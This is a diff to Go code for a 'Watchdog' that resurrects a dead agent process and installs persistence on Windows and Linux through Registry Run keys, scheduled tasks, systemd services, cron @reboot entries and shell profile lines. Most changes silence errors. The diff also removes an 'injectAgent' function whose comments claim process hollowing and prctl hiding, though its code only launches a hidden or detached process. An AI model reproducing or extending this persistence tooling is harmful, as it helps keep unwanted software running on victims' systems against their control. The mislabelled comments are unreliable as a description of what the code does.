@@ -103,7 +103,7 @@ func (w *Watchdog) monitor(ctx context.Context) {
 				missedBeats++
 				if missedBeats >= 3 {
 					fmt.Fprintf(os.Stderr, "[WATCHDOG] Agent dead for %v, resurrecting...\n", since)
-					w.resurrect()
+					_ = w.resurrect()
 					missedBeats = 0
 				}
 			}
@@ -150,27 +150,6 @@ func (w *Watchdog) resurrect() error {
 	return nil
 }
 
-func (w *Watchdog) injectAgent(backupPath string, targetProcess string) error {
-	if runtime.GOOS != "windows" {
-		// On Linux, just spawn a child process hidden via prctl
-		cmd := exec.Command(backupPath)
-		cmd.Stdout = nil
-		cmd.Stderr = nil
-		return cmd.Start()
-	}
-
-	// Windows: Process hollowing
-	cmd := exec.Command("powershell", "-Command", fmt.Sprintf(`
-$pinfo = New-Object System.Diagnostics.ProcessStartInfo
-$pinfo.FileName = '%s'
-$pinfo.RedirectStandardInput = $false
-$pinfo.UseShellExecute = $false
-$pinfo.CreateNoWindow = $true
-$p = [System.Diagnostics.Process]::Start($pinfo)
-`, targetProcess))
-	return cmd.Run()
-}
-
 func (w *Watchdog) installAllPersistence() {
 	var errs []error
 
@@ -209,7 +188,7 @@ func (w *Watchdog) installRegistryRun() error {
 	}
 
 	for _, cmd := range cmds {
-		exec.Command(cmd[0], cmd[1:]...).Run()
+		_ = exec.Command(cmd[0], cmd[1:]...).Run()
 	}
 	return nil
 }
@@ -227,7 +206,7 @@ func (w *Watchdog) installScheduledTask() error {
 	}
 
 	for _, cmd := range cmds {
-		exec.Command(cmd[0], cmd[1:]...).Run()
+		_ = exec.Command(cmd[0], cmd[1:]...).Run()
 	}
 	return nil
 }
@@ -292,11 +271,11 @@ WantedBy=multi-user.target
 		}
 
 		os.WriteFile(filepath.Join(serviceDir, svcName+".service"), []byte(serviceContent), 0644)
-		exec.Command("systemctl", "daemon-reload").Run()
+		_ = exec.Command("systemctl", "daemon-reload").Run()
 		if os.Geteuid() == 0 {
-			exec.Command("systemctl", "enable", svcName+".service").Run()
+			_ = exec.Command("systemctl", "enable", svcName+".service").Run()
 		} else {
-			exec.Command("systemctl", "--user", "enable", svcName+".service").Run()
+			_ = exec.Command("systemctl", "--user", "enable", svcName+".service").Run()
 		}
 	}
 	return nil
@@ -315,7 +294,7 @@ func (w *Watchdog) installCronReboot() error {
 	}
 
 	for _, entry := range cronEntries {
-		exec.Command("sh", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", entry)).Run()
+		_ = exec.Command("sh", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", entry)).Run()
 	}
 	return nil
 }
@@ -339,7 +318,7 @@ func (w *Watchdog) installShellProfile() error {
 		if err != nil {
 			continue
 		}
-		f.WriteString(line)
+		_, _ = f.WriteString(line)
 		f.Close()
 	}
 	return nil
